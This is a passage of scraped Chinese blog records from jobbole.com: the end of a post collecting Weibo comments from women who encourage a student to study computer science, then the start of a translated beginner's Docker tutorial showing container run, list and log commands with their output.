target=\"_blank\">专栏作者</a>。</div><p>高考结束了，填志愿选专业的时候也要来了。最近我们微博收到一个私信求助：</p>\n<p><img class=\"alignnone\" src=\"https://wx2.sinaimg.cn/mw690/7cc829d3gy1fsj78ysbugj20f9051gmi.jpg\" width=\"549\" height=\"181\"></p>\n<blockquote><p><a href=\"https://weibo.com/2093492691/GmruxxXrK\" target=\"_blank\">https://weibo.com/2093492691/GmruxxXrK</a></p></blockquote>\n<p>在<a href=\"http://www.jobbole.com/members/weibo_2093492691\">@程序员的那些事</a> 微博发布后，有位小姐姐还感叹：</p>\n<blockquote><p>@刘不刘二小姐：没想到“计算机太难不适合女生学”的观点五年前我上大学的时候有，现在都火成这样了还有[二哈]</p></blockquote>\n<p>很多关注我们的小姐姐都冒泡留言，鼓励那位求助的女生。汇总如下：</p>\n<blockquote><p>@澈海情深：计算机女生出来说一句，现在干啥都挺难的。学计算机也没有想象中那么恐怖。感兴趣就学呗。</p>\n<p>@眠眠阿卷：选吧，学计算机又不是以后当码农，计算机是个工具，你学了计算机，以后去哪里再读其他专业都受欢迎</p>\n<p>@J家蠢萌痴汉夏：怎么会，我就毕业了呀，毕业还是简单的，只要好好听课，也不会挂科的[二哈] 当年高考结束填志愿，五个全是计算机第一顺位，🙊回过头想想也是有勇气啊</p>\n<p>@凃小斐：老子就是女孩子，毕业的时候专业第一的成绩保送985研究生，谁跟你说女孩子不适合学计算机的出来我打死他</p>\n<p>@于梦杰呀：计算机系女生表示难确实是难，有时还会感觉痛苦，但是只要你好好学肯定是能学好的</p>\n<p>@enchantereyes：喜欢就选。首先再菜毕业也不会难，另外学一行跟干一行是两码事。难得有想学的东西，不试试不会不甘心吗？</p>\n<p>@geekInfo：我也是计算机出来的女生。最初的专业是应用数学选修经济，学了一学期不开心反而喜欢计算机课就转了专业。读大学之前一点编程基础也没有，也不就这么顺利研究生毕业了。毕业成绩年级第二，文凭还没到手就被公司定下来了，到现在一直很喜欢这职业，庆幸当初转了专业，要学自己感兴趣的。</p>\n<p>@月光少爷金：时代不一样了，女程序猿不知道多受欢迎。况且，不学计算机，学统计将来做策略也不错呀</p>\n<p>@芒果很忙busybusy：学吧，入门没有想象中那么难的，我就是程序媛，IT公司女生少，环境相对比较单纯，是非也少，女生挺受宠的</p>\n<p>@茶杯茶茶茶：计算机有脑子的都能学，很好学的，相比于其他的专业，至少很多东西可以直接上手及时反馈，网上教程一大堆，只有计算机方面的可以。</p>\n<p>@翡翠梦境里睡觉的猫：有兴趣就可以选，当年报志愿之前也有人再三强调学计算机累（倒是没说女生不适合，现在想来在当时已经难得），然而我高中学了一点编程觉得有趣，于是选了，于是一路计算机好多年仍然觉得很有趣</p></blockquote>\n<p>其他几个男生的留言：</p>\n<blockquote><p>@MSP-GawainAntarx：难的不是计算机科学，而且怎么让自己抛弃“女生不适合学计算机”的刻板印象</p>\n<p>@mtedrrqcmws2017：1. 年轻女程序员在应聘过程中不但不会被歧视，反而会被有所偏袒，因为公司（尤其是大公司）普遍男生太多，需要女生来平衡工作环境。2. 现代编程语言已经被高度抽象，脱离硬件，倒更加靠近“技术设计”，入门并非男式，比如前端，手机app等。</p></blockquote>\n<p>如果以后还有人和你说「计算机专业不适合女生」之类的，可以把本文发给他们看，让他们看看 IT 行业小姐姐们是如何说的。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114141\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114141votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114141\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 4 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">伯小乐</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/aoi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/2015/11/f2bb4f6f428a49476a2e91c355c8d150.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            伯乐在线小编一枚~~~~PS：我不是@小编辑，不要问我了        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/aoi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/aoi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/aoi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 263</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/ef76a2ab8cf07b49aaa7e162a6c578d1a9ed4a26.jpg"},{"url_object_id": "a80c1972902edd63a90d8bf1ff9bc04b", "title": ["8 个基本的 Docker 容器管理命令"], "url": "http://blog.jobbole.com/114145/", "create_date": "2018/06/22", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Docker, Linux, 容器", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://kerneltalks.com/virtualization/8-basic-docker-container-management-commands/\">Shrikant Lavhate</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9768-1.html\">Linux中国/Lonaparte_CHENG</a>   </div><blockquote><p>利用这 8 个命令可以学习 Docker 容器的基本管理方式。这是一个为 Docker 初学者准备的，带有示范命令输出的指南。</p></blockquote>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/06/91d1e9a10762cf7191f39f8e66ebefa7.png\" alt=\"Docker 容器管理命令\"></p>\n<p>在这篇文章中，我们将带你学习 8 个基本的 Docker 容器命令，它们操控着 Docker 容器的基本活动，例如 运行run、 列举list、 停止stop、 查看历史纪录logs、 删除delete 等等。如果你对 Docker 的概念很陌生，推荐你看看我们的 <a href=\"https://kerneltalks.com/virtualization/what-is-docker-introduction-guide-to-docker/\">介绍指南</a>，来了解 Docker 的基本内容以及 <a href=\"https://kerneltalks.com/virtualization/how-to-install-docker-in-linux/\">如何</a> 在 Linux 上安装 Docker。 现在让我们赶快进入要了解的命令：</p>\n<h3 id=\"toc_1\">如何运行 Docker 容器？</h3>\n<p>众所周知，Docker 容器只是一个运行于宿主操作系统host OS上的应用进程，所以你需要一个镜像来运行它。Docker 镜像以进程的方式运行时就叫做 Docker 容器。你可以加载本地 Docker 镜像，也可以从 Docker Hub 上下载。Docker Hub 是一个提供公有和私有镜像来进行拉取pull操作的集中仓库。官方的 Docker Hub 位于 <a href=\"https://hub.docker.com/\">hub.docker.com</a>。 当你指示 Docker 引擎运行容器时，它会首先搜索本地镜像，如果没有找到，它会从 Docker Hub 上拉取相应的镜像。</p>\n<p>让我们运行一个 Apache web 服务器的 Docker 镜像，比如 httpd 进程。你需要运行 <code>docker container run</code> 命令。旧的命令为 <code>docker run</code>， 但后来 Docker 添加了子命令部分，所以新版本支持下列命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe16358c012664733\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container run -d -p 80:80 httpd\r\nUnable to find image 'httpd:latest' locally\r\nlatest: Pulling from library/httpd\r\n3d77ce4481b1: Pull complete\r\n73674f4d9403: Pull complete\r\nd266646f40bd: Pull complete\r\nce7b0dda0c9f: Pull complete\r\n01729050d692: Pull complete\r\n014246127c67: Pull complete\r\n7cd2e04cf570: Pull complete\r\nDigest: sha256:f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617\r\nStatus: Downloaded newer image for httpd:latest\r\nc46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16358c012664733-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16358c012664733-14\">14</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container run -d -p 80:80 httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-2\"><span class=\"crayon-e\">Unable </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">find </span><span class=\"crayon-i\">image</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'httpd:latest'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">locally</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-3\"><span class=\"crayon-v\">latest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-v\">library</span><span class=\"crayon-o\">/</span><span class=\"crayon-i\">httpd</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-4\"><span class=\"crayon-cn\">3d77ce4481b1</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-5\"><span class=\"crayon-cn\">73674f4d9403</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-6\"><span class=\"crayon-v\">d266646f40bd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-7\"><span class=\"crayon-v\">ce7b0dda0c9f</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-8\"><span class=\"crayon-cn\">01729050d692</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-9\"><span class=\"crayon-cn\">014246127c67</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-i\">complete</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-10\"><span class=\"crayon-cn\">7cd2e04cf570</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pull </span><span class=\"crayon-e\">complete</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-11\"><span class=\"crayon-v\">Digest</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">sha256</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">f4610c3a1a7da35072870625733fd0384515f7e912c6223d4a48c6eb749a8617</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-12\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-e\">latest</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16358c012664733-13\"><span class=\"crayon-i\">c46f2e9e4690f5c28ee7ad508559ceee0160ac3e2b1688a61561ce9f7d99d682</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16358c012664733-14\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0019 seconds] -->\r\n<p>Docker 的 <code>run</code> 命令将镜像名作为强制参数，另外还有很多可选参数。常用的参数有：</p>\n<ul>\n<li><code>-d</code>：从当前 shell 脱离容器</li>\n<li><code>-p X:Y</code>：绑定容器的端口 Y 到宿主机的端口 X</li>\n<li><code>--name</code>：命名你的容器。如果未指定，它将被赋予随机生成的名字</li>\n<li><code>-e</code>：当启动容器时传递环境编辑及其值</li>\n</ul>\n<p>通过以上输出你可以看到，我们将 <code>httpd</code> 作为镜像名来运行容器。接着，本地镜像没有找到，Docker 引擎从 Docker Hub 拉取了它。注意，它下载了镜像 <code>httpd:latest</code>， 其中 <code>:</code> 后面跟着版本号。如果你需要运行特定版本的容器，你可以在镜像名后面注明版本名。如果不提供版本名，Docker 引擎会自动拉取最新的版本。</p>\n<p>输出的最后一行显示了你新运行的 httpd 容器的唯一 ID。</p>\n<h3 id=\"toc_2\">如何列出所有运行中的 Docker 容器？</h3>\n<p>现在，你的容器已经运行起来了，你可能想要确认这一点，或者你想要列出你的机器上运行的所有容器。你可以使用 <code>docker container ls</code> 命令。在旧的 Docker 版本中，对应的命令为 <code>docker ps</code>。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe163596542300982\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container ls\r\nCONTAINER ID        IMAGE               COMMAND              CREATED             STATUS              PORTS                NAMES\r\nc46f2e9e4690        httpd               \"httpd-foreground\"   11 minutes ago      Up 11 minutes       0.0.0.0:80-&gt;80/tcp   cranky_cori\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe163596542300982-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe163596542300982-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe163596542300982-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe163596542300982-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe163596542300982-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container ls</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe163596542300982-2\"><span class=\"crayon-e\">CONTAINER </span><span class=\"crayon-e\">ID        </span><span class=\"crayon-e\">IMAGE               </span><span class=\"crayon-e\">COMMAND              </span><span class=\"crayon-e\">CREATED             </span><span class=\"crayon-e\">STATUS              </span><span class=\"crayon-e\">PORTS                </span><span class=\"crayon-e\">NAMES</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe163596542300982-3\"><span class=\"crayon-e\">c46f2e9e4690        </span><span class=\"crayon-i\">httpd</span><span class=\"crayon-h\">               </span><span class=\"crayon-s\">\"httpd-foreground\"</span><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">minutes </span><span class=\"crayon-e\">ago      </span><span class=\"crayon-i\">Up</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">11</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">minutes</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">0.0.0.0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-cn\">80</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">tcp   </span><span class=\"crayon-v\">cranky</span><span class=\"crayon-sy\">_</span>cori</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe163596542300982-4\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>列出的结果是按列显示的。每一列的值分别为：</p>\n<ol>\n<li>Container ID ：一开始的几个字符对应你的容器的唯一 ID</li>\n<li>Image ：你运行容器的镜像名</li>\n<li>Command ：容器启动后运行的命令</li>\n<li>Created ：创建时间</li>\n<li>Status ：容器当前状态</li>\n<li>Ports ：与宿主端口相连接的端口信息</li>\n<li>Names ：容器名（如果你没有命名你的容器，那么会随机创建）</li>\n</ol>\n<h3 id=\"toc_3\">如何查看 Docker 容器的历史纪录？</h3>\n<p>在第一步我们使用了 <code>-d</code> 参数来将容器，在它一开始运行的时候，就从当前的 shell 中脱离出来。在这种情况下，我们不知道容器里面发生了什么。所以为了查看容器的历史纪录，Docker 提供了 <code>logs</code> 命令。它采用容器名称或 ID 作为参数。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b623fe16359d471344776\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nroot@kerneltalks # docker container logs cranky_cori\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\nAH00558: httpd: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message\r\n[Thu May 31 18:35:07.301158 2018] [mpm_event:notice] [pid 1:tid 139734285989760] AH00489: Apache/2.4.33 (Unix) configured -- resuming normal operations\r\n[Thu May 31 18:35:07.305153 2018] [core:notice] [pid 1:tid 139734285989760] AH00094: Command line: 'httpd -D FOREGROUND'\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b623fe16359d471344776-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16359d471344776-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16359d471344776-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16359d471344776-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b623fe16359d471344776-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b623fe16359d471344776-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b623fe16359d471344776-1\"><span class=\"crayon-v\">root</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">kerneltalks</span><span class=\"crayon-h\"> </span><span class=\"crayon-p\"># docker container logs cranky_cori</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16359d471344776-2\"><span class=\"crayon-v\">AH00558</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">httpd</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Could </span><span class=\"crayon-st\">not</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">reliably </span><span class=\"crayon-e\">determine </span><span class=\"crayon-e\">the </span><span class=\"crayon-i\">server</span><span class=\"crayon-s\">'s fully qualified domain name, using 172.17.0.2. Set the '</span><span class=\"crayon-i\">ServerName</span><span class=\"crayon-s\">' directive globally to suppress this message</span></div><div class=\"crayon-line\" id=\"crayon-5b623fe16359d471344776-3\"><span class=\"crayon-s\">AH00558: httpd: Could not reliably determine the server'</span><span class=\"crayon-i\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">fully </span><span class=\"crayon-e\">qualified </span><span class=\"crayon-e\">domain </span><span class=\"crayon-v\">name</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">using</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">172.17.0.2.</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Set </span><span class=\"crayon-i\">the</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'ServerName'</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">directive </span><span class=\"crayon-e\">globally </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">suppress </span><span class=\"crayon-r\">this</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">message</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b623fe16359d471344776-4\"><span class=\"crayon-sy\">[</span><span class=\"crayon-e\">Thu </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">31</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">18</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">35</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">07.301158</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2018</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-v\">mpm_event</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">notice</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-i\">pid</span><span class=\"crayon-h\"> </span><span 